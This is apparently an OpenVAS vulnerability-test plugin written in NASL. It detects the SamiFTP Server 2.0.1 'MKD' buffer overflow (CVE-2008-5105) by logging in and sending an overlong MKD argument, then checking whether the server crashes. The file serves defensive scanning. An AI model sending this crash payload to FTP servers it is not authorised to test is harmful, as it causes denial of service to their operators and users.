###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samiftp_mkd_cmd_bof_vuln.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# SamiFTP Server 'MKD' Command Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of

# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803738");
  script_version("$Revision: 13499 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-08-17 16:46:05 +0530 (Sat, 17 Aug 2013)");
  script_cve_id("CVE-2008-5105");
  script_name("SamiFTP Server 'MKD' Command Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running SamiFTP Server and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted FTP request via 'MKD' command and check if the server
  stops responding.");

  script_tag(name:"insight", value:"The flaw is due to an unspecified error while parsing 'MKD' command.");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause a denial
  of service.");

  script_tag(name:"affected", value:"Sami FTP Server version 2.0.1, other versions may also be affected");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27523");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/sami-ftp-201-mkd-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/samiftp/detected");

  exit(0);
}

include("ftp_func.inc");

samiPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:samiPort);
if(!banner || "220 Features p a" >!< banner){
  exit(0);
}

soc = open_sock_tcp(samiPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 Features p a" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc1 = open_sock_tcp(samiPort);
if(!soc1){
  exit(0);
}

ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc1);
  exit(0);
}

send(socket:soc1, data:string("MKD ", crap(length: 1000, data:'A'), '\r\n'));
ftp_close(socket:soc1);

for(i=0; i<3; i++)
{
  soc1 = open_sock_tcp(samiPort);

  if(!soc1){
    break;
  }

  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(!ftplogin){
    ftp_close(socket:soc1);
    break;
  }

  send(socket:soc1, data:string("MKD ", crap(length: 1000, data:'A'), '\r\n'));
  ftp_close(socket:soc1);
}

sleep(3);

soc2 = open_sock_tcp(samiPort);
if(!soc2){
  security_message(port:samiPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
ftp_close(socket:soc2);
if(!resp || "220 Features p a" >!< resp){
  security_message(port:samiPort);
  exit(0);
}